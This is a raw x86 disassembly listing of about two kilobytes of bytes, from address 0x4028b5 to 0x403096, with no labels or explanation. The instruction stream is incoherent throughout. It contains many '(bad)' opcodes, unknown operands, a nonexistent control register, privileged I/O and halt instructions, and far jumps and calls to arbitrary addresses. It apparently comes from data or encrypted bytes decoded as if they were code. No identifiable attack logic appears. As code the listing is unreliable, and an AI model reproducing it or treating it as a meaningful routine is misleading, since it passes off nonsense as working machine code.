  4028b5:	js     0x4028ae
  4028b7:	imul   DWORD PTR [edi]
  4028b9:	cmc    
  4028ba:	test   eax,0x60a349bc
  4028bf:	repnz call 0x316d:0xa428698f
  4028c7:	xchg   esi,eax
  4028c8:	test   al,0x5c
  4028ca:	pop    ebp
  4028cb:	sub    esp,DWORD PTR [ecx-0x44]
  4028ce:	idiv   dh
  4028d0:	loope  0x4028ad
  4028d2:	cmp    al,0x53
  4028d4:	retf   
  4028d5:	lea    eax,[edx+0x6f]
  4028d8:	cmp    al,0xcf
  4028da:	and    eax,0xe269768e
  4028df:	cmp    al,0x84
  4028e1:	fiadd  DWORD PTR [ecx]
  4028e3:	and    DWORD PTR [ebp-0x7f],eax
  4028e6:	sub    dl,dl
  4028e8:	ins    BYTE PTR es:[edi],dx
  4028e9:	or     al,BYTE PTR [ebp+0x7cc719ff]
  4028ef:	test   DWORD PTR [ecx],0x6074d520
  4028f5:	daa    
  4028f6:	inc    ebx
  4028f7:	pop    edi
  4028f8:	mov    edx,0x66eb2061
  4028fd:	mov    al,0x96
  4028ff:	and    BYTE PTR [eax+0x22e1d89d],0xc3
  402906:	dec    edi
  402907:	out    dx,eax
  402908:	lods   al,BYTE PTR ds:[esi]
  402909:	jns    0x40291d
  40290b:	popf   
  40290c:	and    edx,edi
  40290e:	cld    
  40290f:	loope  0x4028db
  402911:	loop   0x40289b
  402913:	cdq    
  402914:	dec    esp
  402915:	repz test eax,0x8b80f8b0
  40291b:	jmp    0x78d233c9
  402920:	ja     0x4028ed
  402922:	loope  0x4028b7
  402924:	jmp    0xa9e3:0x8b319e99
  40292b:	fdivr  DWORD PTR [edi-0x6dcc1091]
  402931:	xchg   esp,eax
  402932:	mov    ds:0xbe04223d,al
  402937:	pop    ecx
  402938:	jmp    0xf6be9a9b
  40293d:	inc    edx
  40293e:	stos   BYTE PTR es:[edi],al
  40293f:	cld    
  402940:	and    DWORD PTR es:[ebp+0x53be48e9],0xb7050dff
  40294b:	mov    cl,0x32
  40294d:	push   cs
  40294e:	hlt    
  40294f:	jle    0x402904
  402951:	out    dx,al
  402952:	cmc    
  402953:	stos   BYTE PTR es:[edi],al
  402954:	enter  0xd77d,0x42
  402958:	cmp    ch,bh
  40295a:	jl     0x402901
  40295c:	and    dl,BYTE PTR [esi+0x4b]
  40295f:	and    bl,ch
  402961:	sub    al,0x61
  402963:	nop
  402964:	dec    ecx
  402965:	(bad)  
  402966:	pop    eax
  402967:	clc    
  402968:	mov    ds:0x8d3dc20b,al
  40296d:	int    0x6
  40296f:	arpl   WORD PTR [edi],bx
  402971:	ret    0x291
  402974:	or     DWORD PTR [esi+0x20c20aac],esp
  40297a:	push   0xaacb0b29
  40297f:	adc    eax,0x388ee120
  402984:	push   es
  402985:	aas    
  402986:	rcr    ah,cl
  402988:	add    al,0xdb
  40298a:	mov    ecx,0x76843c7f
  40298f:	std    
  402990:	push   edi
  402991:	bound  eax,QWORD PTR [eax-0x404474b3]
  402997:	sbb    DWORD PTR [edx+ecx*2],0x66ac8398
  40299e:	mov    ecx,0x3f26661c
  4029a3:	jmp    0x22199dcf
  4029a8:	inc    eax
  4029a9:	sbb    ah,BYTE PTR [edx]
  4029ab:	hlt    
  4029ac:	push   edi
  4029ad:	push   es
  4029ae:	mov    ch,0xf5
  4029b0:	pop    edi
  4029b1:	ds or  ah,bh
  4029b4:	xor    dh,dl
  4029b6:	mov    ecx,0x238b6db8
  4029bb:	pop    ds
  4029bc:	adc    eax,0xe6947f7c
  4029c1:	adc    eax,edi
  4029c3:	dec    ecx
  4029c4:	retf   
  4029c5:	into   
  4029c6:	dec    esp
  4029c7:	lods   al,BYTE PTR ds:[esi]
  4029c8:	jl     0x402971
  4029ca:	sbb    eax,0x260bbeef
  4029cf:	mov    ch,0x3d
  4029d1:	jl     0x4029bd
  4029d3:	pop    ss
  4029d4:	mov    ah,0xfa
  4029d6:	(bad)  
  4029d7:	jmp    0xd533f292
  4029dc:	cwde   
  4029dd:	inc    edi
  4029de:	int    0xab
  4029e0:	loope  0x402a20
  4029e2:	add    eax,0xc8234b68
  4029e7:	(bad)  
  4029e8:	and    eax,0x5daa0efe
  4029ed:	lds    ebx,FWORD PTR [esp+edx*8]
  4029f0:	or     ebp,edi
  4029f2:	cmp    eax,DWORD PTR [ecx-0x50]
  4029f5:	repz mov ?,edi
  4029f8:	fs pop es
  4029fa:	xor    al,al
  4029fc:	or     al,0x67
  4029fe:	and    DWORD PTR [eax+0x5f],0xb08eb915
  402a05:	rcl    BYTE PTR [esi+0x4c5cff69],cl
  402a0b:	xor    eax,0x379292f1
  402a10:	icebp  
  402a11:	adc    eax,0xb1650caf
  402a16:	cld    
  402a17:	push   ebp
  402a18:	das    
  402a19:	scas   al,BYTE PTR es:[edi]
  402a1a:	inc    edi
  402a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a1c:	mov    dh,0x77
  402a1e:	xchg   esi,eax
  402a1f:	fs jne 0x4029ff
  402a22:	hlt    
  402a23:	imul   eax,DWORD PTR [ecx-0x568fdc5f],0xffffffde
  402a2a:	sub    BYTE PTR [edx+eiz*8-0x24103f38],ah
  402a31:	pop    ebp
  402a32:	mov    bl,0xd
  402a34:	inc    eax
  402a35:	scas   eax,DWORD PTR es:[edi]
  402a36:	daa    
  402a37:	jle    0x402a74
  402a39:	loopne 0x4029c0
  402a3b:	pop    edx
  402a3c:	jle    0x402abd
  402a3e:	lea    edi,[esp+ecx*4]
  402a41:	jecxz  0x402a70
  402a43:	pop    ecx
  402a44:	or     ch,BYTE PTR [edx-0x53]
  402a47:	lds    ecx,FWORD PTR [eax+ecx*2-0x7be82912]
  402a4e:	inc    esi
  402a4f:	sbb    eax,0xf7dd4f67
  402a54:	and    DWORD PTR [ebx+edx*4-0x32],ebp
  402a58:	and    DWORD PTR [ecx+eiz*8+0x2491240b],edx
  402a5f:	push   esp
  402a60:	sub    bl,BYTE PTR [ebx+0x170494f8]
  402a66:	jle    0x402a2a
  402a68:	push   ecx
  402a69:	lahf   
  402a6a:	push   ebp
  402a6b:	repnz test DWORD PTR [edx-0x60cb5c21],edi
  402a72:	inc    ecx
  402a73:	sbb    dh,bl
  402a75:	xchg   BYTE PTR [ebp+eax*4+0x53991719],cl
  402a7c:	in     al,0x88
  402a7e:	push   ebp
  402a7f:	push   edi
  402a80:	and    esp,DWORD PTR [esi-0x74ba184e]
  402a86:	outs   dx,DWORD PTR ds:[esi]
  402a87:	movzx  ebp,ax
  402a8a:	out    0x6,eax
  402a8c:	retf   0x5f21
  402a8f:	nop
  402a90:	not    BYTE PTR [esi+0x27]
  402a93:	xchg   BYTE PTR [ebx],bh
  402a95:	xor    dh,dh
  402a97:	aam    0xb9
  402a99:	sub    ebx,DWORD PTR [edx-0x6f]
  402a9c:	pop    esp
  402a9d:	pop    ebp
  402a9e:	or     edi,DWORD PTR ds:[edi+ebp*8+0x21]
  402aa3:	add    al,0x42
  402aa5:	test   eax,0x2260d59f
  402aaa:	ror    DWORD PTR [ebp-0x1b],cl
  402aad:	int3   
  402aae:	xchg   edx,eax
  402aaf:	mov    bh,0x75
  402ab1:	xchg   esp,eax
  402ab2:	pop    eax
  402ab3:	xchg   edx,eax
  402ab4:	cmp    ch,dh
  402ab6:	scas   al,BYTE PTR es:[edi]
  402ab7:	iret   
  402ab8:	or     BYTE PTR [ecx+0x65],ch
  402abb:	ficomp WORD PTR [esi]
  402abd:	push   es
  402abe:	sub    DWORD PTR [esi+ecx*4-0x5e],ebp
  402ac2:	mov    ebx,DWORD PTR [edi-0x6]
  402ac5:	push   edx
  402ac6:	push   0xfa8a10eb
  402acb:	inc    esi
  402acc:	(bad)  
  402acd:	pop    ds
  402ace:	loopne 0x402a82
  402ad0:	inc    edi
  402ad1:	ds add eax,0xbd35afb4
  402ad7:	and    edi,DWORD PTR [ecx]
  402ad9:	mov    bl,0xc1
  402adb:	cmp    dh,BYTE PTR [ecx+0x2a003932]
  402ae1:	frstor [edi+0x365f074a]
  402ae7:	fisub  DWORD PTR ds:[ebp+0x17]
  402aeb:	fwait
  402aec:	(bad)  
  402aed:	das    
  402aee:	fist   DWORD PTR [ebp-0x6]
  402af1:	arpl   sp,ax
  402af3:	mov    dh,0x84
  402af5:	int    0x44
  402af7:	xchg   ebx,eax
  402af8:	mov    ?,WORD PTR [ecx+esi*4+0x3f]
  402afc:	add    BYTE PTR [edi-0x34f6a7f],bl
  402b02:	jns    0x402b08
  402b04:	and    esi,DWORD PTR [ebx]
  402b06:	ror    DWORD PTR [edi+0x6a],0xad
  402b0a:	jmp    0x3857:0x3d132e64
  402b11:	dec    edx
  402b12:	mov    eax,0xd4850ba6
  402b17:	test   al,0xb5
  402b19:	add    DWORD PTR [ecx],ebx
  402b1b:	(bad)  
  402b1c:	retf   
  402b1d:	dec    esp
  402b1e:	dec    edi
  402b1f:	ret    
  402b20:	lods   al,BYTE PTR ds:[esi]
  402b21:	int3   
  402b22:	dec    eax
  402b23:	arpl   WORD PTR [edx+0x8],sp
  402b26:	ret    
  402b27:	add    al,0xc7
  402b29:	inc    eax
  402b2a:	dec    edi
  402b2b:	jge    0x402b43
  402b2d:	cmp    BYTE PTR [esi+0x66],cl
  402b30:	dec    eax
  402b31:	addr16 jg 0x402ad1
  402b34:	mov    bl,0xf8
  402b36:	cmc    
  402b37:	ja     0x402af7
  402b39:	in     al,dx
  402b3a:	add    esi,DWORD PTR [edx-0x30]
  402b3d:	mov    al,ds:0xaecd65a7
  402b42:	dec    ecx
  402b43:	dec    ebp
  402b44:	jle    0x402aff
  402b46:	arpl   di,sp
  402b48:	or     dl,BYTE PTR [eax+eiz*8-0x6b]
  402b4c:	jmp    0x856986f2
  402b51:	aaa    
  402b52:	mov    ah,0x55
  402b54:	enter  0x6664,0x2c
  402b58:	dec    edi
  402b59:	mov    BYTE PTR [ecx+edx*4+0x27],al
  402b5d:	repz xor DWORD PTR [esi],ebx
  402b60:	hlt    
  402b61:	fwait
  402b62:	test   ebp,ebx
  402b64:	stos   BYTE PTR es:[edi],al
  402b65:	(bad)  
  402b67:	loop   0x402b1b
  402b69:	cmc    
  402b6a:	ret    0x5229
  402b6d:	inc    ebp
  402b6e:	pop    esp
  402b6f:	pop    ds
  402b70:	mov    edi,DWORD PTR [ebp+0x4a]
  402b73:	push   ebp
  402b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b75:	jb     0x402ba4
  402b77:	jmp    0xef38:0x5ae54e3f
  402b7e:	add    DWORD PTR [ecx-0xd69ed95],0xffffffc5
  402b85:	mov    bl,0x5
  402b87:	mov    BYTE PTR [ecx-0x14ff1068],ch
  402b8d:	adc    al,0xaf
  402b8f:	fisttp QWORD PTR [eax+edi*2+0x2ea647d2]
  402b96:	ffreep st(5)
  402b98:	jle    0x402b6c
  402b9a:	(bad)  
  402b9b:	movzx  edx,sp
  402b9e:	xor    BYTE PTR [esi+0x62],bh
  402ba1:	jle    0x402b8f
  402ba3:	retf   
  402ba4:	mov    ds:0x7d97d971,eax
  402ba9:	sahf   
  402baa:	inc    esp
  402bab:	dec    edx
  402bac:	pop    ds
  402bad:	sub    ebp,DWORD PTR [esi-0x52]
  402bb0:	xchg   ecx,eax
  402bb1:	ss loopne 0x402b37
  402bb4:	in     al,0x90
  402bb6:	mov    esi,0x376a2882
  402bbb:	jmp    0x402b71
  402bbd:	fsub   DWORD PTR [eax+edx*1-0x2]
  402bc1:	repz shr cl,1
  402bc4:	in     al,dx
  402bc5:	js     0x402c37
  402bc7:	or     eax,0x9979a3b6
  402bcc:	ret    
  402bcd:	push   0xffffff9f
  402bcf:	ret    0xf1cd
  402bd2:	push   ds
  402bd3:	and    DWORD PTR [esi-0x3e],0x3fab80dc
  402bda:	xor    eax,0xc6446c6d
  402bdf:	or     esp,DWORD PTR [ebp-0x751c3b0c]
  402be5:	cmc    
  402be6:	xchg   DWORD PTR [ebx-0x79cf72fe],ebp
  402bec:	pusha  
  402bed:	push   cs
  402bee:	xor    DWORD PTR ds:0x4ea236b6,0xffffffb2
  402bf5:	mov    bl,0xe6
  402bf7:	xchg   esi,eax
  402bf8:	cmp    al,0x2d
  402bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bfb:	cmp    bh,dl
  402bfd:	add    DWORD PTR [eax],0x25
  402c00:	pop    esi
  402c01:	adc    al,0xd3
  402c03:	adc    al,0x7c
  402c05:	push   ds
  402c06:	icebp  
  402c07:	fist   WORD PTR [esi]
  402c09:	mov    edi,0xda255cd7
  402c0e:	shr    DWORD PTR [eax-0x203151bc],cl
  402c14:	div    BYTE PTR [edx-0x4e3b5a5d]
  402c1a:	sub    al,cl
  402c1c:	iret   
  402c1d:	idiv   BYTE PTR [ebp-0x76c3b6a4]
  402c23:	test   eax,0xebf7b111
  402c28:	xor    al,0x95
  402c2a:	retf   
  402c2b:	inc    ebx
  402c2c:	xchg   esi,eax
  402c2d:	ss jbe 0x402c42
  402c30:	in     eax,0x41
  402c32:	outs   dx,BYTE PTR ds:[esi]
  402c33:	add    DWORD PTR [ecx+0x3814a32f],esp
  402c39:	or     al,0x3e
  402c3b:	test   BYTE PTR [ecx+edi*8],ch
  402c3e:	push   ds
  402c3f:	(bad)  
  402c40:	cmp    bh,bh
  402c42:	call   0xc0c:0x44539840
  402c49:	cdq    
  402c4a:	repz js 0x402bf0
  402c4d:	popf   
  402c4e:	pop    es
  402c4f:	inc    edi
  402c50:	sub    eax,0x3575e4c9
  402c55:	ret    
  402c56:	cwde   
  402c57:	mov    dl,0xfb
  402c59:	and    BYTE PTR [esi],al
  402c5b:	lods   al,BYTE PTR ds:[esi]
  402c5c:	inc    ebx
  402c5d:	push   ss
  402c5e:	xor    al,0x39
  402c60:	mov    cs,WORD PTR [ebp-0x5991bb4a]
  402c66:	dec    ecx
  402c67:	push   esi
  402c68:	pop    esp
  402c69:	fiadd  WORD PTR [edx]
  402c6b:	mov    ds:0xd6e592a0,eax
  402c70:	cmc    
  402c71:	mov    ds:0x89f7cf7f,al
  402c76:	lods   eax,DWORD PTR ds:[esi]
  402c77:	out    dx,eax
  402c78:	adc    al,ch
  402c7a:	(bad)
  402c7d:	xor    DWORD PTR [ecx-0x52],ebp
  402c80:	ss (bad) 
  402c82:	mov    DWORD PTR [edi+0xf41d63c],esi
  402c88:	mov    esp,0x745713a0
  402c8d:	shl    BYTE PTR [esi+0x18],cl
  402c90:	xchg   edi,eax
  402c91:	shl    BYTE PTR [eax-0x20],cl
  402c94:	cld    
  402c95:	xor    al,0x12
  402c97:	and    ah,ah
  402c99:	push   ds
  402c9a:	pop    ebx
  402c9b:	fisttp QWORD PTR [ebp+0x18]
  402c9e:	adc    DWORD PTR [edx],esi
  402ca0:	pusha  
  402ca1:	(bad)  
  402ca2:	fidiv  WORD PTR [eax+0x3f]
  402ca5:	push   eax
  402ca6:	jmp    0x402c32
  402ca8:	fbld   TBYTE PTR [edi+0x25]
  402cab:	enter  0xb1a8,0x8c
  402caf:	pop    edi
  402cb0:	jge    0x402ca6
  402cb2:	sbb    eax,0x13313788
  402cb7:	mov    edi,0x379bb882
  402cbc:	out    0x7,eax
  402cbe:	mov    ecx,0xf3d6994f
  402cc3:	pop    ss
  402cc4:	adc    BYTE PTR ds:0x719f3b8b,bh
  402cca:	loope  0x402d27
  402ccc:	sub    esp,DWORD PTR [eax]
  402cce:	in     eax,0x4
  402cd0:	dec    BYTE PTR [ecx+0x5d]
  402cd3:	mov    al,0xe6
  402cd5:	adc    eax,0xf1d55107
  402cda:	or     DWORD PTR [edx-0x334bf23c],edx
  402ce0:	push   ecx
  402ce1:	ja     0x402c8c
  402ce3:	div    DWORD PTR [edx+0x110357ab]
  402ce9:	push   edx
  402cea:	jno    0x402cda
  402cec:	and    ecx,DWORD PTR [ebp+ebx*1-0x57b40f42]
  402cf3:	and    eax,esp
  402cf5:	pop    ss
  402cf6:	jmp    0xaaa3:0x308fccb1
  402cfd:	sbb    dl,BYTE PTR [esi]
  402cff:	mov    bl,0xbb
  402d01:	cmp    BYTE PTR [ebx+0x7055ea7f],ah
  402d07:	scas   al,BYTE PTR es:[edi]
  402d08:	dec    edi
  402d09:	xchg   edx,eax
  402d0a:	xchg   ebx,eax
  402d0b:	retf   0x9572
  402d0e:	dec    ebx
  402d0f:	pop    ecx
  402d10:	imul   esi,DWORD PTR [ecx+0xa6ff47b],0x84e3225
  402d1a:	add    bl,BYTE PTR [ecx]
  402d1c:	call   0xf14bffb4
  402d21:	add    dh,bh
  402d23:	mov    esp,0x9532a86a
  402d28:	pop    di
  402d2a:	xchg   esp,eax
  402d2b:	pop    esi
  402d2c:	xchg   DWORD PTR [ecx-0x6ab38058],edi
  402d32:	loopne 0x402da6
  402d34:	pop    ss
  402d35:	(bad)  
  402d36:	scas   eax,DWORD PTR es:[edi]
  402d37:	(bad)  
  402d39:	ins    DWORD PTR es:[edi],dx
  402d3a:	mov    ebp,0xe1ff825b
  402d3f:	stos   DWORD PTR es:[edi],eax
  402d40:	(bad)  
  402d41:	jge    0x402d66
  402d43:	js     0x402cd3
  402d45:	jge    0x402d0d
  402d47:	xchg   edi,eax
  402d48:	ret    0xa3c
  402d4b:	bound  ebx,QWORD PTR [edi]
  402d4d:	push   es
  402d4e:	cmp    eax,0xf0f56df2
  402d53:	jbe    0x402d70
  402d55:	(bad)  
  402d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d57:	retf   
  402d58:	mov    ebx,0x7f6a3dfc
  402d5d:	add    BYTE PTR [ebp-0x1e201af2],ah
  402d63:	scas   al,BYTE PTR es:[edi]
  402d64:	ins    BYTE PTR es:[edi],dx
  402d65:	mov    edi,ecx
  402d67:	jmp    0xdcb5:0x8b95bdf6
  402d6e:	int3   
  402d6f:	or     ch,bh
  402d71:	bound  edx,QWORD PTR [ebx+0x7ac3e1a5]
  402d77:	cmp    BYTE PTR [esi-0x3b5677a7],0x66
  402d7e:	call   0x8cca:0x2ede960b
  402d85:	test   al,0xf1
  402d87:	jns    0x402df8
  402d89:	retf   0x1d25
  402d8c:	jo     0x402e04
  402d8e:	add    cl,BYTE PTR [edx-0x7aa7d7c]
  402d94:	jb     0x402da1
  402d96:	mov    eax,0x193814af
  402d9b:	(bad)  
  402d9c:	repnz sub BYTE PTR [edx],cl
  402d9f:	rcr    esi,cl
  402da1:	xor    cl,cl
  402da3:	sbb    eax,0x67ce5c72
  402da8:	sar    DWORD PTR [ebx],cl
  402daa:	mov    dh,0xae
  402dac:	ins    DWORD PTR es:[edi],dx
  402dad:	sbb    eax,0xb7bef355
  402db2:	imul   esi,esp,0x9504d007
  402db8:	je     0x402d5f
  402dba:	xlat   BYTE PTR ds:[ebx]
  402dbb:	cwde   
  402dbc:	pop    ebp
  402dbd:	fcmovb st,st(1)
  402dbf:	mov    edx,0xbcc6937f
  402dc4:	lods   al,BYTE PTR ds:[esi]
  402dc5:	ret    
  402dc6:	mov    bh,ah
  402dc8:	fsub   st,st(3)
  402dca:	lahf   
  402dcb:	cvtps2pi mm3,QWORD PTR [eax+0x33fbf293]
  402dd2:	add    bh,BYTE PTR [ebx+ebp*8-0x32596f7c]
  402dd9:	mov    cl,0x7
  402ddb:	push   ds
  402ddc:	add    al,0x83
  402dde:	mov    cl,BYTE PTR [eax-0x541aaa09]
  402de4:	or     BYTE PTR [ecx-0x103c05bb],bh
  402dea:	addr16 xchg ebx,eax
  402dec:	adc    DWORD PTR [esi],esp
  402dee:	call   0x424c62ff
  402df3:	jmp    0xba8b:0x6c2b3bca
  402dfa:	ficom  WORD PTR [ecx]
  402dfc:	int    0xce
  402dfe:	fdivr  DWORD PTR [eax+ebp*1+0x3f]
  402e02:	dec    eax
  402e03:	xchg   edi,eax
  402e04:	sub    DWORD PTR [ecx+eiz*8-0x6d],edi
  402e08:	or     ebp,DWORD PTR [ebp+edx*1-0x14]
  402e0c:	cmp    esi,DWORD PTR [esi]
  402e0e:	or     DWORD PTR gs:[ecx+0x3d02c0d],eax
  402e15:	fisubr WORD PTR [edx-0x2b]
  402e18:	mov    ebp,0xffd1dc13
  402e1d:	mov    cr7,edx
  402e20:	cld    
  402e21:	sbb    esp,edx
  402e23:	adc    dh,BYTE PTR [edx]
  402e25:	(bad)  
  402e26:	pushf  
  402e27:	(bad)
  402e2b:	ror    ecx,cl
  402e2d:	dec    edi
  402e2e:	or     ah,bl
  402e30:	and    al,bh
  402e32:	in     eax,0xa0
  402e34:	mov    ds:0x389e8064,eax
  402e39:	pop    ss
  402e3a:	(bad)  
  402e3b:	mov    dl,0x21
  402e3d:	jmp    esp
  402e3f:	mov    eax,ds:0x81f66e3
  402e44:	adc    dh,BYTE PTR [esi]
  402e46:	xchg   DWORD PTR [edi],edi
  402e48:	pop    esi
  402e49:	(bad)  
  402e4a:	ja     0x402e76
  402e4c:	xchg   DWORD PTR [edx-0x9],esp
  402e4f:	sub    al,0x1a
  402e51:	aad    0xdd
  402e53:	add    eax,0xddfd3be9
  402e58:	ds and al,0xdf
  402e5b:	sbb    al,0x81
  402e5d:	(bad)  
  402e5e:	cmp    al,0x93
  402e60:	idiv   BYTE PTR [ecx]
  402e62:	inc    esp
  402e63:	neg    BYTE PTR [ecx+0x29]
  402e66:	mov    esi,0xb9dedbc4
  402e6b:	sbb    BYTE PTR [eax+0x69],0xf5
  402e6f:	sbb    DWORD PTR [ecx],ebx
  402e71:	arpl   WORD PTR [ebx],ax
  402e73:	pop    ds
  402e74:	test   eax,0x594b7f8e
  402e79:	rcr    DWORD PTR [ecx+0x403a31c0],0xbc
  402e80:	xchg   ecx,eax
  402e81:	pop    esi
  402e82:	es sti 
  402e84:	xchg   edi,eax
  402e85:	jbe    0x402e3e
  402e87:	cs mov edx,0x7d09b04e
  402e8d:	aaa    
  402e8e:	add    eax,0xf52e427d
  402e93:	out    0x91,eax
  402e95:	dec    edi
  402e96:	icebp  
  402e97:	imul   ebp,DWORD PTR [esi],0xffffffb2
  402e9a:	test   al,0xe8
  402e9c:	stos   BYTE PTR es:[edi],al
  402e9d:	jecxz  0x402ed8
  402e9f:	cmp    ah,BYTE PTR [edi]
  402ea1:	and    ch,BYTE PTR [esi]
  402ea3:	fcom   DWORD PTR [eax-0x6ac5d4d0]
  402ea9:	(bad)  [esi+eax*8-0x5f9a350b]
  402eb0:	mov    eax,0x1e8b6fa0
  402eb5:	int    0x74
  402eb7:	jbe    0x402f07
  402eb9:	adc    BYTE PTR [ebx-0x1ddea707],dl
  402ebf:	dec    edx
  402ec0:	ins    DWORD PTR es:[edi],dx
  402ec1:	je     0x402e51
  402ec3:	pop    ecx
  402ec4:	stos   DWORD PTR es:[edi],eax
  402ec5:	add    BYTE PTR [esi],0x25
  402ec8:	popa   
  402ec9:	hlt    
  402eca:	pop    eax
  402ecb:	add    edx,DWORD PTR [esi+eiz*8-0x27]
  402ecf:	mov    ebx,0xc52c03ba
  402ed4:	neg    DWORD PTR [ecx+0x66dae052]
  402eda:	aas    
  402edb:	fld    DWORD PTR [eax-0x56]
  402ede:	mov    eax,0xb5200d17
  402ee3:	adc    DWORD PTR [edx-0x4d],ecx
  402ee6:	mov    ds:0x24a7e192,eax
  402eeb:	jae    0x402f3d
  402eed:	mov    cl,BYTE PTR [edx]
  402eef:	leave  
  402ef0:	mov    ch,BYTE PTR [ecx+ebp*4-0x2a56b1a]
  402ef7:	cmc    
  402ef8:	sbb    cl,BYTE PTR [edx-0x26a0f845]
  402efe:	icebp  
  402eff:	push   ds
  402f00:	or     ebp,DWORD PTR [eax+edx*2+0x6a]
  402f04:	push   ds
  402f05:	push   edx
  402f06:	(bad)  
  402f07:	cmp    BYTE PTR [esi+0x2d],dh
  402f0a:	popa   
  402f0b:	push   es
  402f0c:	push   ecx
  402f0d:	popa   
  402f0e:	or     BYTE PTR [esi+0x53],ch
  402f11:	shl    BYTE PTR [edi-0x44c46598],1
  402f17:	sub    esp,ecx
  402f19:	pusha  
  402f1a:	dec    ebp
  402f1b:	sbb    bh,BYTE PTR [edx]
  402f1d:	xchg   edx,eax
  402f1e:	ja     0x402ece
  402f20:	outs   dx,BYTE PTR ds:[esi]
  402f21:	mov    ah,0x5b
  402f23:	pop    esi
  402f24:	nop
  402f25:	sbb    al,0x61
  402f27:	outs   dx,BYTE PTR ds:[esi]
  402f28:	mov    ecx,0x2524dcd9
  402f2d:	mov    ds:0x8b46f9ab,eax
  402f32:	leave  
  402f33:	retf   
  402f34:	scas   al,BYTE PTR es:[edi]
  402f35:	push   eax
  402f36:	xchg   ecx,eax
  402f37:	in     eax,0x7d
  402f39:	stos   BYTE PTR es:[edi],al
  402f3a:	push   cs
  402f3b:	lds    ecx,FWORD PTR [esi+0x251b42d5]
  402f41:	jb     0x402f6a
  402f43:	rcl    bl,0xb9
  402f46:	je     0x402f15
  402f48:	jae    0x402f16
  402f4a:	daa    
  402f4b:	ins    BYTE PTR es:[edi],dx
  402f4c:	pop    ecx
  402f4d:	add    al,cl
  402f4f:	ins    BYTE PTR es:[edi],dx
  402f50:	lock cdq 
  402f52:	outs   dx,DWORD PTR ds:[esi]
  402f53:	adc    BYTE PTR [ebx+0x4f],dh
  402f56:	fisttp DWORD PTR ds:0x4888863
  402f5c:	aad    0x5e
  402f5e:	cmp    eax,0x34578614
  402f63:	into   
  402f64:	cmp    ebp,DWORD PTR [edi+eiz*4]
  402f67:	ret    0x2b0f
  402f6a:	lock retf 0x52d5
  402f6e:	jns    0x402f36
  402f70:	sub    bl,BYTE PTR [ebx]
  402f72:	sub    DWORD PTR [ebx+0x5655a645],0xffffffa8
  402f79:	in     eax,dx
  402f7a:	xor    eax,0xca366f40
  402f7f:	icebp  
  402f80:	jl     0x402f6a
  402f82:	sahf   
  402f83:	sahf   
  402f84:	dec    esi
  402f85:	fist   WORD PTR [ebp-0x55dcd5d1]
  402f8b:	jmp    0x546ad673
  402f90:	xor    al,0xd1
  402f92:	sub    dh,BYTE PTR [esi]
  402f94:	gs pop ebp
  402f96:	daa    
  402f97:	sbb    al,0xf5
  402f99:	add    al,BYTE PTR [esi+esi*2-0x38f1495b]
  402fa0:	sub    al,0x83
  402fa2:	out    0x88,al
  402fa4:	xor    eax,0x2631482b
  402fa9:	inc    eax
  402faa:	push   esp
  402fab:	mov    edi,0x6cca5f7f
  402fb0:	stos   BYTE PTR es:[edi],al
  402fb1:	ret    
  402fb2:	sub    ebx,DWORD PTR [eax+0x331c2326]
  402fb8:	sub    eax,0xa4a3c488
  402fbd:	popa   
  402fbe:	inc    ebx
  402fbf:	test   edx,0xd5045d8d
  402fc5:	jl     0x403039
  402fc7:	jno    0x402fdd
  402fc9:	ins    DWORD PTR es:[edi],dx
  402fca:	xchg   edi,eax
  402fcb:	(bad)  
  402fcc:	pusha  
  402fcd:	ja     0x402fbd
  402fcf:	dec    edi
  402fd0:	popa   
  402fd1:	jecxz  0x403031
  402fd3:	push   ds
  402fd4:	lock leave 
  402fd6:	in     eax,0x6a
  402fd8:	jl     0x402fdd
  402fda:	or     edx,DWORD PTR [edi]
  402fdc:	je     0x402fa3
  402fde:	cmp    cl,BYTE PTR [eax+0x675b1e16]
  402fe4:	and    esp,DWORD PTR [ebx]
  402fe6:	jo     0x402fab
  402fe8:	cmp    BYTE PTR [ebp-0x49],0xaa
  402fec:	es jmp 0x403048
  402fef:	inc    ebx
  402ff0:	pop    ecx
  402ff1:	or     ebp,DWORD PTR [ebx]
  402ff3:	mov    BYTE PTR [edx-0x5f169e37],bh
  402ff9:	cmc    
  402ffa:	mov    ecx,0x9191d542
  402fff:	test   DWORD PTR [esi-0xb],0xe11b765
  403006:	adc    BYTE PTR [ecx+0x6e7b0293],ah
  40300c:	sti    
  40300d:	js     0x402fce
  40300f:	and    BYTE PTR [ecx-0x6cde4610],bh
  403015:	jnp    0x402fb7
  403017:	jno    0x403056
  403019:	sub    BYTE PTR [edi+0x28f02792],al
  40301f:	xchg   bh,ah
  403021:	mov    ds:0xa3c0da76,al
  403026:	pop    edx
  403027:	test   DWORD PTR [ebx-0x11da2efd],edx
  40302d:	jl     0x403026
  40302f:	icebp  
  403030:	(bad)  [esi]
  403032:	dec    edx
  403033:	sub    DWORD PTR [ecx+0x738a2586],0xffffffe2
  40303a:	cdq    
  40303b:	pop    esp
  40303c:	inc    ebx
  40303d:	jmp    0x402fed
  40303f:	add    ecx,esp
  403041:	push   ebx
  403042:	dec    ecx
  403043:	in     eax,dx
  403044:	test   al,0x28
  403046:	fcom   DWORD PTR [ebx]
  403048:	fnsave [eax+0xae21e69]
  40304e:	in     eax,0xa1
  403050:	xor    al,0x31
  403052:	call   DWORD PTR [esi+0x6990722b]
  403058:	in     al,dx
  403059:	xor    esp,DWORD PTR [ebx+0x1531cbf9]
  40305f:	jns    0x40309d
  403061:	mov    esp,0x8fd27cd7
  403066:	fwait
  403067:	jle    0x402ffb
  403069:	sub    dh,BYTE PTR [edx]
  40306b:	outs   dx,DWORD PTR ds:[esi]
  40306c:	add    DWORD PTR [edx+0x69],0x7
  403070:	cmp    BYTE PTR [esi+0x36],cl
  403073:	jmp    0x2c842a1e
  403078:	adc    ebx,DWORD PTR [ecx-0x1b]
  40307b:	mov    WORD PTR [ebx+0x7f],es
  40307e:	sahf   
  40307f:	or     DWORD PTR [ebx],ecx
  403081:	xchg   ecx,eax
  403082:	mov    DWORD PTR [ecx],ecx
  403084:	pop    edx
  403085:	inc    DWORD PTR [edx]
  403087:	stos   BYTE PTR es:[edi],al
  403088:	inc    esp
  403089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40308a:	add    DWORD PTR [esi+0x67ddba94],esp
  403090:	mov    BYTE PTR [ecx+0x5d751ae7],dh
  403096:	rcr    BYTE PTR [ebp-0x1e],1
